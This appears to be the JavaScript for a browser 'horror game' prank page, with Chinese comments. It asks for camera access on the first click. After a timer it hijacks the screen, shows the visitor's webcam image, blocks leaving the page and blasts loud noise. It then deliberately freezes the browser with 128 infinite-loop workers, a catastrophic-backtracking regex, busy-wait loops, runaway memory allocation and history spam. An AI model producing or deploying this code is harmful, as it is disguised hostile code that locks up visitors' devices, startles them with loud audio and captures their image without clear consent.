/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
   STATUS: FINAL ABSOLUTE DEADLOCK
   FEATURES: Auto-Homing, Soul Capture, Unresponsive UI, Fullscreen Hijack
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let videoStream = null;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 攝像頭權限預備 (Soul Access)
async function setupCamera() {
    try {
        // 必須在 HTTPS 環境下執行
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoStream = stream;
        console.log("Soul partition accessed.");
    } catch (err) {
        console.log("Access denied by user/system.");
    }
}

// 2. 跨平台音頻 (Glitch -> Noise Bomb)
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                // 崩潰後：極大聲白噪音
                output[i] = (Math.random() * 2 - 1) * 0.98;
            } else {
                // 崩潰前：數位干擾聲
                let g = (t & (t >> 8)) ? 0.06 : -0.06;
                output[i] = (Math.random() * 0.08) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
}

// 3. 核心：第一次載入的啟動陷阱 (First-Time Fix)
const startSystem = async () => {
    if (audioStarted) return;
    audioStarted = true;

    // A. 請求相機與音頻
    await setupCamera();
    startCreepyVoice();

    // B. 強制全屏 (這是讓 F 掣失效後的唯一解法)
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    // C. 隱藏 Intro，啟動遊戲
    intro.style.display = 'none';
    isLightOn = true;
    console.log("Protocol 026: Online.");
};

// 點擊螢幕任何地方啟動
intro.addEventListener('click', startSystem);
window.addEventListener('touchstart', startSystem);

// 4. 自動獵殺：白色靈魂 (Auto-Homing Soul)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    const side = Math.floor(Math.random() * 4);
    let startX, startY;
    if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; }
    else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; }
    else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
    else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }

    glitchBlock.style.cssText = `position:fixed; width:40px; height:40px; background:white; z-index:10001; left:${startX}px; top:${startY}px; box-shadow:0 0 40px 10px white; transition:transform 0.05s linear; pointer-events:none;`;
    document.body.appendChild(glitchBlock);

    let currentX = startX, currentY = startY;
    const speed = 4.8; 

    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); return; }
        const centerX = window.innerWidth / 2, centerY = window.innerHeight / 2;
        const dx = centerX - (currentX + 20), dy = centerY - (currentY + 20);
        const distance = Math.sqrt(dx * dx + dy * dy);

        if (distance < 35) {
            triggerFinalCrash();
            glitchBlock.remove();
            clearInterval(hunterInterval);
        } else {
            currentX += (dx / distance) * speed;
            currentY += (dy / distance) * speed;
            glitchBlock.style.left = `${currentX}px`;
            glitchBlock.style.top = `${currentY}px`;
            const scale = 1 + (250 / distance); 
            glitchBlock.style.transform = `scale(${scale})`;
        }
    }, 16);
}, 25000); 

// 5. 攝像頭奪魂 (Distortion)
function captureAndDistort() {
    if (!videoStream) return;
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = videoStream;
    video.play();

    setTimeout(() => {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.filter = 'grayscale(100%) contrast(1000%) brightness(25%) invert(10%)';
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/jpeg');
        const ds = document.getElementById('death-screen');
        if (ds) {
            ds.style.backgroundImage = `url(${dataUrl})`;
            ds.style.backgroundSize = 'cover';
        }
        videoStream.getTracks().forEach(t => t.stop());
    }, 50);
}

// 6. 核心：絕對死鎖 (Absolute Deadlock - Roblox Style)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 顯示死機畫面
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red; margin:0; animation: jitter 0.1s infinite;">HELP ME.</h1>
            <style>@keyframes jitter { 0% {transform: translate(1px, 1px);} 50% {transform: translate(-1px, -1px);} 100% {transform: translate(1px, -1px);} }</style>
        </div>
    `;

    // B. 執行拍照與全屏
    captureAndDistort();
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    window.onbeforeunload = () => "STAY.";

    // C. 啟動死鎖循環 (每 1.5 秒鎖死一次，繞過監控但卡死 UI)
    setTimeout(() => {
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let o = ac.createOscillator();
            o.type = 'sawtooth'; o.frequency.value = 50 + Math.random() * 8000;
            o.connect(ac.destination); o.start();
        }, 30);

        const b = new Blob([`while(true){postMessage(0)}`], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        for(let i=0; i<128; i++) new Worker(u);

        const vault = [];
        function lock() {
            const bomb = /^(a+)+$/;
            bomb.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); // 正則炸彈鎖死渲染

            const s = Date.now();
            while(Date.now() - s < 1500) { Math.atan2(Math.random(), 1); } // 同步鎖死

            for(let i=0; i<100; i++) {
                vault.push(new BigUint64Array(1024 * 10)); 
                window.history.pushState(null, null, "#" + Math.random());
            }

            Promise.resolve().then(lock); // 微任務無限隊列
            setTimeout(lock, 0); 
        }
        lock();
    }, 100);
}

// 7. 玩家控制
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('keydown', (e) => {
    if (e.key.toLowerCase() === 'f') startSystem(); // F 掣現在也會觸發啟動
    if (systemCrashed) return;
    
    let k = e.key.toLowerCase();
    if (k === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'black';
    }
    const spd = 60;
    if (k === 'w') posY += spd; if (k === 's') posY -= spd;
    if (k === 'a') posX += spd; if (k === 'd') posX -= spd;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
